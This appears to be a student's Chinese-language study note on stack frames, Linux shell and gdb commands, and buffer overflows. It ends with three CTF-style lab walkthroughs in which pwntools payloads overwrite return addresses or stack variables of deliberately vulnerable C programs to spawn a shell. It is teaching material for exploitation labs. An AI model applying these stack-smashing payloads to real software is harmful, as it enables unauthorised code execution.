栈帧

大部分给的定义是过程活动记录，我觉得每个栈帧相当于栈中每个帧，在一个未运行完的函数，每一帧都是一个活动状态，每个栈帧中保存了该函数的返回地址和局部变量。而每个栈帧的共同点是满足栈帧平衡状态。

栈帧平衡：

PUSH EBP；函数开始（使用EBP前先把已有值保存到栈中）


MOV EBP ,ESP；保存当前ESP到EBP中


Xxxxxx；函数体，无论ESP值如何变化，EBP都保持不变，可以安全访问函数的局部变量、参数

MOV ESP EBP；将函数的起始地址返回到ESP中


POP EBP；函数返回前弹出保存在栈中的EBP值


RETN；函数终止

转移指令-CALL指令（“调用”指令）

Push retaddr；将下一条指令的所在地址（即当时程序计数器PC的内容）入栈
Jmp ；跳转至子程序

转移指令-Ret指令

Pop Retaddr；将下一条指令的所在地址出栈
jmp;跳转

Linux shell

Linux系统的shell作为操作系统的外壳，为用户提供使用操作系统的接口，进而控制系统。

cd：（Change Directory）切换工作目录

语法：

cd (选项) (参数)

实例：

cd进入用户主目录；
cd ~  进入用户主目录；
cd -  返回进入此目录之前所在的目录；
cd ..  返回上级目录（若当前目录为“/“，则执行完后在“/"；".."为上级目录的意思）；
cd ../..  返回上两级目录；
cd !$  把上个命令的参数作为cd参数使用

ls(list),显示目标列表

语法：

ls（选项）（参数）

实例

ls；显示当前目录下非影藏文件与目录

ls -a；显示当前目录下包括影藏文件在内的所有文件列表

ls -1；输出长格式列表

ls -m；水平输出文件列表

ls -t；修改最后一次编辑的文件，最近修改的文件显示在最上面。

ls -R；显示递归文件

ls -n；打印文件的UID和GID

ls -l；列出文件和文件夹的详细信息

ls -lh；列出可读文件和文件夹详细信息

ls -ld；显示文件夹信息

ls -lt；按时间列出文件和文件夹详细信息

ls -ltr；按修改时间列出文件和文件夹详细信息

ls -F；按照特殊字符对文件进行分类

ls --color=auto；列出文件并标记颜色分类

chmod ：变更文件或目录的权限

语法

chmod(选项)(参数)

实例

r=读取属性　　//值＝4
w=写入属性　　//值＝2
x=执行属性　　//值＝1

chmod u+x,g+w f01　　//为文件f01设置自己可以执行，组员可以写入的权限
chmod u=rwx,g=rw,o=r f01
chmod 764 f01
chmod a+x f01　　//对文件f01的u,g,o都设置可执行属性

objdump:快速查看信息工具

 -d；disassemble，从objfile中反汇编那些特定指令机器码的section

gdb：程序调试器

语法

gdb(选项)(参数)

实例：

gdb <文件名>；加载被调试的可执行程序文件。因为一般都在被调试程序所在目录下执行GDB，因而文本名不需要带路径
gdb r；Run，运行被调试的程序。如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。
gdb c；Continue，继续执行被调试程序，直至下一个断点或程序结束	
gdb b <行号>
gdb b <函数名称>
gdb b *<函数名称>
gdb b *<代码地址> 
gdb d [编号]；Breakpoint，设置断点。两可以使用“行号”“函数名称”“执行地址”等方式指定断点位置。
gdb s:执行一行源程序代码，如果此行代码中有函数调用，则进入该函数，相当于其它调试器中的“Step Into (单步跟踪进入)”；
gdb n:执行一行源程序代码，此行代码中的函数调用也一并执行，相当于其它调试器中的“Step Over (单步跟踪)”。

注：s,n这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）

gdb si;类似s命令
gdb ni;命令类似于n命令
gdb p <变量名称>;Print，显示指定变量（临时变量或全局变量）的值
gdb display;设置程序中断后欲显示的数据及其格式。
gdb i;info，用于显示各类信息
gdb q;Quit,退出GDB调试环境.
gdb help;GDB帮助命令，提供对GDB名种命令的解释说明。
如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。

缓冲区溢出

根据栈帧实例中的入栈方式（由低地址->高地址写入），往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，造成程序崩溃或使程序转而执行其它指令。

Ret_slide

在不知道返回地址偏移时，通过加载ret指令，形象于在其他任意转移指令滑行，保证最后一个转移指令将到达目标地址即可实现

p1.exe

源码：

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void cmd()
{
	system("sh");
}
void A()
{
	char a[100];
	scanf("%s",a);
	return;
}
int main(){
	A();
}

1.linux下打开系统终端

2.输入cd Desktop,进入桌面，输入objdump -d p1，显示p1文件的反汇编信息

3.找到cmd函数的地址0x0804846b并保存，

4.输入gdb p1,进入gdb指令窗口

5.输入 start,开始运行程序，根据源代码中只提供100个空间的数组，我们输入pattc 200,随机生成有200个字符的有序字符串，输入c,表示continue，使程序继续运行，直接copy输入生成的字符串，可想我们故意让缓存区溢出后，原本存放ret addr的栈处被其他字符占据，程序运行后返回一个程序运行错误的地址0x41384141，即原本存储ret addr的地址，于是我们在接下来的步骤中只需让该出错地址指向cmd的地址，就可操控命令行

6.输入patto 0x41384141,找到offset的位置112，说明返回指令的地址与输入函数的地址相差112个字节

7.打开终端，进入桌面，进入python交互界面，输入from pwn import *,调用pwn函数，输入p=process("./p1"),启用当前目录下的文件p1

8.设置变量a='a'*112,保证数组所在的栈的空间被填满，下一步添加转换至cmd函数的地址，根据小端序的存储原理，再附加地址时要人为先输入高地址的十六进制下的字节a+="\x6b\x84\x04\x08",输入p.sendline(a),将变量a发送给python处理，输入p.interactive(),实现交互

3-13.exe

源码

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void A()
{
setvbuf(stdout, 0, _IONBF, 0);
	srand(time(0) ^ getpid());
	char buf[100];
	int magic = rand();
	gets(buf);
	if (atoi(buf) == magic) {
		puts("Okay...");
		system("sh");
	}
}
int main(){
	A();
}

1.观察源码发现当buf==magic,才能进入system界面，获取shell,不难发现buf是数组，可以出现缓存区溢出的情况，那么我们只需要控制buf地址上的数与magic地址上的数相等即可，首先可以通过汇编代码中转移指令的原理通过rand()函数和gets()函数找到buf和magic的地址

2.进入桌面，用gdb指令打开name.exe文件，start，用ni 逐步运行程序，通过rand（）函数找到magic的地址[ebp-0X1C]，通过gets()函数找到buf的首地址[ebp-0X80]，计算两者相差100个字节

3.进入Python交互页面，同样的，调用pwn这个库，此次定义a='0'*100+"\x00\x00\x00\x00",可实现交互

ret slide

1.采用p1.exe的源码，根据滑行的原理，我们可以通过不断ret 到一个函数结尾，只要最后保证能够运行到指向cmd函数的地址即可

2。前面的步骤与第一体相似，找到cmd地址,随意找到一个ret的地址0x\08048547

3.进入Python交互页面，利用python定义变量a="\x47\x85\x04\x08"*30+“\x6b\x84\x04\x08",实现交互
